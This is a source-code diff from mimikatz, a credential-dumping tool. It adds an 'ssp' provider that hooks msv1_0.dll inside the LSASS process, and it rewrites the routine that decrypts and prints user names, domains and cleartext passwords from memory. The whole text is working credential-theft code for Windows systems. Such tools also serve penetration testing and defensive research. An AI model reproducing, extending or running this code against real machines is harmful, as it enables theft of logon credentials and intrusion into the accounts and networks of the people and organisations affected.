@@ -59,6 +59,7 @@ vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_sekurlsa::getMimiKatzCom
 	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_kerberos::getKerberos,	L"kerberos",L"énumère les sessions courantes du provider Kerberos"));
 	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_tspkg::getTsPkg,		L"tspkg",	L"énumère les sessions courantes du provider TsPkg"));
 	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_livessp::getLiveSSP,	L"livessp",	L"énumère les sessions courantes du provider LiveSSP"));
+	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mod_mimikatz_sekurlsa_ssp::getSSP,	L"ssp",	L"énumère les sessions courantes du provider SSP (msv1_0)"));
 	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(getLogonPasswords,	L"logonPasswords",	L"énumère les sessions courantes des providers disponibles"));
 	return monVector;
 }
@@ -93,6 +94,8 @@ bool mod_mimikatz_sekurlsa::unloadLsaSrv()
 		delete mod_mimikatz_sekurlsa_tspkg::pModTSPKG;
 	if(mod_mimikatz_sekurlsa_wdigest::pModWDIGEST)
 		delete mod_mimikatz_sekurlsa_wdigest::pModWDIGEST;
+	if(mod_mimikatz_sekurlsa_ssp::pModMSV)
+		delete mod_mimikatz_sekurlsa_ssp::pModMSV;
 
 	if(g_pRandomKey)
 		if(*g_pRandomKey)
@@ -156,6 +159,11 @@ bool mod_mimikatz_sekurlsa::searchLSASSDatas()
 							{
 								lePointeur = &mod_mimikatz_sekurlsa_kerberos::pModKERBEROS;
 								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_kerberos::getKerberosLogonData, wstring(L"kerberos")));
+							}
+							else if((_wcsicmp(leModule->szModule.c_str(), L"msv1_0.dll") == 0) && !mod_mimikatz_sekurlsa_ssp::pModMSV)
+							{
+								lePointeur = &mod_mimikatz_sekurlsa_ssp::pModMSV;
+								GLOB_ALL_Providers.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_ssp::getSSPLogonData, wstring(L"ssp")));
 							}
 
 							if(lePointeur)
@@ -425,21 +433,39 @@ PVOID mod_mimikatz_sekurlsa::getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsig
 	return resultat;
 }
 
-void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isTsPkg)
+void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isDomainFirst, PDWORD pos)
 {
 	if(mesCreds)
 	{
-		wstring password = mod_process::getUnicodeStringOfProcess(&mesCreds->Password, hLSASS, SeckPkgFunctionTable->LsaUnprotectMemory);//getUnicodeString(&mesCreds->Password, true);
-		if(justSecurity)
-			wcout << password;
-		else
+		if(mesCreds->Password.Buffer || mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer)
 		{
-			wstring userName = mod_process::getUnicodeStringOfProcess(&mesCreds->UserName, hLSASS);
-			wstring domainName = mod_process::getUnicodeStringOfProcess(&mesCreds->Domaine, hLSASS);
-			wcout << endl <<
-				L"\t * Utilisateur  : " << (isTsPkg ? domainName : userName) << endl <<
-				L"\t * Domaine      : " << (isTsPkg ? userName : domainName) << endl <<
-				L"\t * Mot de passe : " << password;
+			wstring userName	= mod_process::getUnicodeStringOfProcess(&mesCreds->UserName, hLSASS);
+			wstring domainName	= mod_process::getUnicodeStringOfProcess(&mesCreds->Domaine, hLSASS);
+			wstring password	= mod_process::getUnicodeStringOfProcess(&mesCreds->Password, hLSASS, SeckPkgFunctionTable->LsaUnprotectMemory);
+			wstring rUserName	= (isDomainFirst ? domainName : userName);
+			wstring rDomainName	= (isDomainFirst ? userName : domainName);
+
+			if(justSecurity)
+			{
+				if(!pos)
+					wcout << password;
+				else
+					wcout << endl <<
+						L"\t [" << *pos << L"] { " << rUserName << L" ; " << rDomainName << L" ; " << password << L" }";
+			}
+			else
+			{
+				if(!pos)
+					wcout << endl <<
+						L"\t * Utilisateur  : " << rUserName << endl <<
+						L"\t * Domaine      : " << rDomainName << endl <<
+						L"\t * Mot de passe : " << password;
+				else
+					wcout << endl <<
+						L"\t * [" << *pos  << L"] Utilisateur  : " << rUserName << endl <<
+						L"\t       Domaine      : " << rDomainName << endl <<
+						L"\t       Mot de passe : " << password;
+			}
 		}
 	} else wcout << L"n.t. (LUID KO)";
 }
@@ -466,7 +492,7 @@ bool mod_mimikatz_sekurlsa::getLogonData(vector<wstring> * mesArguments, vector<
 
 					for(vector<pair<PFN_ENUM_BY_LUID, wstring>>::iterator monProvider = mesProviders->begin(); monProvider != mesProviders->end(); monProvider++)
 					{
-						wcout << L'\t' << monProvider->second << L" : \t";
+						wcout << L'\t' << monProvider->second << (mesArguments->empty() ? (L" :") : (L"")) << L'\t';
 						monProvider->first(&sessions[i], mesArguments->empty());
 						wcout << endl;
 					}
